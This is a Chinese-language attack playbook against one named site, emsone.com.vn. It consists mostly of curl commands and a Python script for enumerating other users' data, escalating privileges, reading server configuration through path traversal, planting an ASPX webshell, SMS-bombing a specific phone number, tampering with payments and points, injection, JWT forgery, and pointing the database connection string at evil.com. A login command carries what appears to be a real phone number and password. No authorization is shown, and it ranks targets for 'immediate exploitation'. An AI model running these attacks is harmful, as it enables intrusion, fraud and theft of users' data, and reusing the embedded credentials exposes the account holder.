# emsone.com.vn 登录后攻击面挖掘

## 🔐 认证后攻击面（核心）

### 1. IDOR - 水平越权

```bash
# 获取自己的用户ID
curl "https://emsone.com.vn/api/user/profile" \
  -H "Cookie: ASP.NET_SessionId=VALID_SESSION" \
  --http2 | jq '.userId'

# 遍历其他用户数据
for user_id in {1..10000}; do
    curl "https://emsone.com.vn/api/user/$user_id" \
      -H "Cookie: ASP.NET_SessionId=VALID_SESSION" \
      --http2 | grep -i "email\|phone\|address" && \
      echo "[!] 用户ID: $user_id"
done

# 修改参数
curl "https://emsone.com.vn/api/user/profile?id=1" \
  -H "Cookie: ASP.NET_SessionId=VALID_SESSION" \
  --http2

# 数组参数
curl "https://emsone.com.vn/api/user?ids[]=1&ids[]=2&ids[]=999" \
  -H "Cookie: ASP.NET_SessionId=VALID_SESSION" \
  --http2

# JSON参数
curl "https://emsone.com.vn/api/user" \
  -H "Cookie: ASP.NET_SessionId=VALID_SESSION" \
  -H "Content-Type: application/json" \
  -d '{"userId": 999}' --http2
```

### 2. IDOR - 垂直越权

```bash
# 管理员功能
curl "https://emsone.com.vn/admin/users" \
  -H "Cookie: ASP.NET_SessionId=USER_SESSION" \
  --http2

# 修改角色参数
curl -X POST "https://emsone.com.vn/api/user/role" \
  -H "Cookie: ASP.NET_SessionId=USER_SESSION" \
  -d "userId=1&role=admin" --http2

# 权限提升
curl -X POST "https://emsone.com.vn/api/admin/create" \
  -H "Cookie: ASP.NET_SessionId=USER_SESSION" \
  -H "X-User-Role: admin" \
  --http2
```

### 3. 敏感数据访问

```bash
# 订单数据
curl "https://emsone.com.vn/api/orders?userId=ALL" \
  -H "Cookie: ASP.NET_SessionId=VALID_SESSION" \
  --http2

# 支付信息
curl "https://emsone.com.vn/api/payment/cards" \
  -H "Cookie: ASP.NET_SessionId=VALID_SESSION" \
  --http2

# 个人信息批量导出
curl "https://emsone.com.vn/api/export/users?format=csv" \
  -H "Cookie: ASP.NET_SessionId=VALID_SESSION" \
  --http2 -o users.csv

# 日志查看
curl "https://emsone.com.vn/api/logs?level=all" \
  -H "Cookie: ASP.NET_SessionId=VALID_SESSION" \
  --http2

# 统计数据（可能包含敏感信息）
curl "https://emsone.com.vn/api/stats/dashboard" \
  -H "Cookie: ASP.NET_SessionId=VALID_SESSION" \
  --http2
```

### 4. 功能滥用

#### 文件上传/下载
```bash
# 任意文件下载
curl "https://emsone.com.vn/api/file/download?file=../../../etc/passwd" \
  -H "Cookie: ASP.NET_SessionId=VALID_SESSION" \
  --http2

# 文件上传到任意路径
curl -X POST "https://emsone.com.vn/api/file/upload" \
  -H "Cookie: ASP.NET_SessionId=VALID_SESSION" \
  -F "file=@shell.php" \
  -F "path=../../../var/www/html/" \
  --http2

# 文件覆盖
curl -X POST "https://emsone.com.vn/api/file/upload" \
  -H "Cookie: ASP.NET_SessionId=VALID_SESSION" \
  -F "file=@malicious.php" \
  -F "overwrite=true" \
  --http2
```

#### 邮件/短信发送
```bash
# 邮件发送（无限制）
curl -X POST "https://emsone.com.vn/api/mail/send" \
  -H "Cookie: ASP.NET_SessionId=VALID_SESSION" \
  -d "to=target@example.com&subject=Test&body=<script>alert(1)</script>" \
  --http2

# 短信轰炸
for i in {1..1000}; do
    curl -X POST "https://emsone.com.vn/api/sms/send" \
      -H "Cookie: ASP.NET_SessionId=VALID_SESSION" \
      -d "phone=0934257886&message=Test$i" \
      --http2
done
```

#### 订单/支付操作
```bash
# 修改订单金额
curl -X POST "https://emsone.com.vn/api/order/update" \
  -H "Cookie: ASP.NET_SessionId=VALID_SESSION" \
  -d "orderId=123&amount=0.01" \
  --http2

# 重复支付
for i in {1..10}; do
    curl -X POST "https://emsone.com.vn/api/payment/process" \
      -H "Cookie: ASP.NET_SessionId=VALID_SESSION" \
      -d "orderId=123&amount=1000" \
      --http2
done

# 负数金额
curl -X POST "https://emsone.com.vn/api/payment/process" \
  -H "Cookie: ASP.NET_SessionId=VALID_SESSION" \
  -d "orderId=123&amount=-1000" \
  --http2
```

### 5. 业务逻辑漏洞

#### 账户接管
```bash
# 修改邮箱（未验证）
curl -X POST "https://emsone.com.vn/api/user/change-email" \
  -H "Cookie: ASP.NET_SessionId=VALID_SESSION" \
  -d "email=attacker@evil.com" \
  --http2

# 修改手机号（未验证）
curl -X POST "https://emsone.com.vn/api/user/change-phone" \
  -H "Cookie: ASP.NET_SessionId=VALID_SESSION" \
  -d "phone=0934000000" \
  --http2

# 密码重置（IDOR）
curl -X POST "https://emsone.com.vn/api/user/reset-password" \
  -H "Cookie: ASP.NET_SessionId=VALID_SESSION" \
  -d "userId=999&newPassword=Hacked123!" \
  --http2
```

#### 奖励/积分滥用
```bash
# 积分重复领取
for i in {1..100}; do
    curl -X POST "https://emsone.com.vn/api/reward/claim" \
      -H "Cookie: ASP.NET_SessionId=VALID_SESSION" \
      -d "rewardId=1" \
      --http2
done

# 修改积分数量
curl -X POST "https://emsone.com.vn/api/points/add" \
  -H "Cookie: ASP.NET_SessionId=VALID_SESSION" \
  -d "points=999999" \
  --http2

# 负数积分
curl -X POST "https://emsone.com.vn/api/points/use" \
  -H "Cookie: ASP.NET_SessionId=VALID_SESSION" \
  -d "points=-999999" \
  --http2
```

### 6. API权限绕过

```bash
# 删除Authorization头
curl "https://emsone.com.vn/api/admin/users" \
  -H "Cookie: ASP.NET_SessionId=VALID_SESSION" \
  --http2

# 修改JWT（如果使用）
# 1. 获取JWT
JWT=$(curl "https://emsone.com.vn/api/login" \
  -d "MobileNumber=0934257886&Password=Thanhdat89%40" \
  --http2 | jq -r '.token')

# 2. 解码JWT
echo $JWT | cut -d. -f2 | base64 -d | jq .

# 3. 修改role为admin
# 4. 重新签名（None算法）
curl "https://emsone.com.vn/api/admin/users" \
  -H "Authorization: Bearer MODIFIED_JWT" \
  --http2

# 参数污染
curl "https://emsone.com.vn/api/admin/users?role=user&role=admin" \
  -H "Cookie: ASP.NET_SessionId=VALID_SESSION" \
  --http2
```

### 7. 文件操作漏洞

#### 任意文件读取
```bash
# 配置文件
curl "https://emsone.com.vn/api/file/view?path=../../../web.config" \
  -H "Cookie: ASP.NET_SessionId=VALID_SESSION" \
  --http2

# 数据库配置
curl "https://emsone.com.vn/api/file/view?path=../../../appsettings.json" \
  -H "Cookie: ASP.NET_SessionId=VALID_SESSION" \
  --http2

# 日志文件
curl "https://emsone.com.vn/api/logs/view?file=../../../logs/error.log" \
  -H "Cookie: ASP.NET_SessionId=VALID_SESSION" \
  --http2
```

#### 任意文件写入
```bash
# 写入Webshell
curl -X POST "https://emsone.com.vn/api/file/save" \
  -H "Cookie: ASP.NET_SessionId=VALID_SESSION" \
  -d "path=../../../var/www/html/shell.aspx&content=<%@ Page Language='C#' %><% System.Diagnostics.Process.Start('cmd.exe','/c whoami'); %>" \
  --http2

# 写入配置文件
curl -X POST "https://emsone.com.vn/api/config/update" \
  -H "Cookie: ASP.NET_SessionId=VALID_SESSION" \
  -d "config=appsettings.json&data={\"ConnectionString\":\"Data Source=evil.com;\"}" \
  --http2
```

### 8. 数据导出漏洞

```bash
# 无限制导出
curl "https://emsone.com.vn/api/export/users?format=csv&limit=999999" \
  -H "Cookie: ASP.NET_SessionId=VALID_SESSION" \
  --http2 -o all_users.csv

# SQL注入导出
curl "https://emsone.com.vn/api/export/orders?sql=SELECT * FROM users" \
  -H "Cookie: ASP.NET_SessionId=VALID_SESSION" \
  --http2

# 导出其他用户数据
curl "https://emsone.com.vn/api/export/user-data?userId=999" \
  -H "Cookie: ASP.NET_SessionId=VALID_SESSION" \
  --http2
```

### 9. 搜索功能漏洞

```bash
# SQL注入搜索
curl "https://emsone.com.vn/api/search?q=' OR 1=1--" \
  -H "Cookie: ASP.NET_SessionId=VALID_SESSION" \
  --http2

# NoSQL注入
curl "https://emsone.com.vn/api/search" \
  -H "Cookie: ASP.NET_SessionId=VALID_SESSION" \
  -H "Content-Type: application/json" \
  -d '{"q":{"$ne":null}}' \
  --http2

# 信息泄露（返回过多数据）
curl "https://emsone.com.vn/api/search?q=*" \
  -H "Cookie: ASP.NET_SessionId=VALID_SESSION" \
  --http2
```

### 10. 批量操作漏洞

```bash
# 批量删除
curl -X POST "https://emsone.com.vn/api/users/delete" \
  -H "Cookie: ASP.NET_SessionId=VALID_SESSION" \
  -d "userIds=1,2,3,4,5,999" \
  --http2

# 批量修改
curl -X POST "https://emsone.com.vn/api/users/update" \
  -H "Cookie: ASP.NET_SessionId=VALID_SESSION" \
  -d "userIds=1,2,3&role=admin" \
  --http2

# 数组参数
curl -X POST "https://emsone.com.vn/api/users/delete" \
  -H "Cookie: ASP.NET_SessionId=VALID_SESSION" \
  -d "userIds[]=1&userIds[]=2&userIds[]=999" \
  --http2
```

---

## 🚀 自动化测试脚本

```python
#!/usr/bin/env python3
# emsone_authenticated_attacks.py

import requests
import json
import sys

TARGET = "https://emsone.com.vn"
SESSION = requests.Session()
SESSION.verify = False
SESSION.headers.update({
    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64)",
    "Accept": "application/json, text/javascript, */*; q=0.01",
})

# 登录获取Session
def login(mobile, password):
    """登录获取Session"""
    data = {"MobileNumber": mobile, "Password": password}
    r = SESSION.post(f"{TARGET}/Account/JLogin", data=data)
    if r.status_code == 200 or "成功" in r.text:
        print(f"[+] 登录成功: {mobile}")
        return True
    return False

# IDOR测试
def test_idor():
    """IDOR水平越权测试"""
    print("[+] 测试IDOR...")
    
    # 获取自己的用户ID
    r = SESSION.get(f"{TARGET}/api/user/profile")
    if r.status_code == 200:
        try:
            my_id = json.loads(r.text).get('userId', 1)
            print(f"[+] 当前用户ID: {my_id}")
        except:
            my_id = 1
    
    # 遍历其他用户
    for user_id in range(1, 100):
        if user_id == my_id:
            continue
        r = SESSION.get(f"{TARGET}/api/user/{user_id}")
        if r.status_code == 200 and len(r.text) > 100:
            print(f"[!] IDOR漏洞: 可访问用户 {user_id}")
            print(f"    数据: {r.text[:200]}")

# 敏感数据访问
def test_sensitive_data():
    """敏感数据访问测试"""
    print("[+] 测试敏感数据访问...")
    
    endpoints = [
        "/api/orders",
        "/api/payment/cards",
        "/api/export/users",
        "/api/logs",
        "/api/stats/dashboard",
        "/api/admin/users",
    ]
    
    for endpoint in endpoints:
        r = SESSION.get(f"{TARGET}{endpoint}")
        if r.status_code == 200:
            print(f"[!] 可访问: {endpoint}")
            if len(r.text) > 1000:
                print(f"    数据量: {len(r.text)} bytes")

# 功能滥用
def test_function_abuse():
    """功能滥用测试"""
    print("[+] 测试功能滥用...")
    
    # 邮件发送
    r = SESSION.post(f"{TARGET}/api/mail/send", 
        data={"to": "test@evil.com", "subject": "Test", "body": "Test"})
    if r.status_code == 200:
        print("[!] 邮件发送功能可滥用")
    
    # 文件下载
    r = SESSION.get(f"{TARGET}/api/file/download?file=../../../etc/passwd")
    if r.status_code == 200 and "root:" in r.text:
        print("[!] 任意文件下载漏洞")

# 业务逻辑漏洞
def test_business_logic():
    """业务逻辑漏洞测试"""
    print("[+] 测试业务逻辑漏洞...")
    
    # 修改邮箱
    r = SESSION.post(f"{TARGET}/api/user/change-email",
        data={"email": "attacker@evil.com"})
    if r.status_code == 200:
        print("[!] 邮箱修改未验证")
    
    # 积分滥用
    r = SESSION.post(f"{TARGET}/api/points/add",
        data={"points": 999999})
    if r.status_code == 200:
        print("[!] 积分可随意修改")

# 文件操作
def test_file_operations():
    """文件操作漏洞测试"""
    print("[+] 测试文件操作...")
    
    # 读取配置文件
    r = SESSION.get(f"{TARGET}/api/file/view?path=../../../web.config")
    if r.status_code == 200:
        print("[!] 可读取配置文件")
        if "connectionString" in r.text.lower():
            print("[!] 包含数据库连接字符串")
    
    # 写入文件
    r = SESSION.post(f"{TARGET}/api/file/save",
        data={"path": "../../../test.txt", "content": "test"})
    if r.status_code == 200:
        print("[!] 可写入任意文件")

def main():
    if len(sys.argv) < 3:
        print("用法: python3 emsone_authenticated_attacks.py <mobile> <password>")
        sys.exit(1)
    
    mobile = sys.argv[1]
    password = sys.argv[2]
    
    if not login(mobile, password):
        print("[-] 登录失败")
        sys.exit(1)
    
    print("\n" + "="*60)
    print("[+] 开始认证后攻击面测试")
    print("="*60 + "\n")
    
    test_idor()
    test_sensitive_data()
    test_function_abuse()
    test_business_logic()
    test_file_operations()
    
    print("\n[+] 测试完成")

if __name__ == "__main__":
    main()
```

---

## 📋 快速测试清单

```bash
# 1. IDOR测试
curl "https://emsone.com.vn/api/user/1" \
  -H "Cookie: ASP.NET_SessionId=VALID_SESSION" --http2

# 2. 敏感数据
curl "https://emsone.com.vn/api/orders" \
  -H "Cookie: ASP.NET_SessionId=VALID_SESSION" --http2

# 3. 文件操作
curl "https://emsone.com.vn/api/file/view?path=../../../web.config" \
  -H "Cookie: ASP.NET_SessionId=VALID_SESSION" --http2

# 4. 功能滥用
curl -X POST "https://emsone.com.vn/api/mail/send" \
  -H "Cookie: ASP.NET_SessionId=VALID_SESSION" \
  -d "to=evil@evil.com&body=test" --http2

# 5. 权限绕过
curl "https://emsone.com.vn/api/admin/users" \
  -H "Cookie: ASP.NET_SessionId=VALID_SESSION" --http2
```

---

## 🎯 优先级排序

**P0 - 立即利用：**
1. IDOR（水平/垂直越权）
2. 任意文件读取（配置文件）
3. 权限绕过（管理员功能）

**P1 - 高价值：**
4. 敏感数据访问（订单/支付）
5. 文件写入（Webshell）
6. 账户接管（邮箱/手机号修改）

**P2 - 中价值：**
7. 功能滥用（邮件/短信）
8. 业务逻辑漏洞（积分/奖励）
9. 数据导出漏洞

**P3 - 低价值：**
10. 搜索功能漏洞
11. 批量操作漏洞

---

**最后更新：2025-11-05**
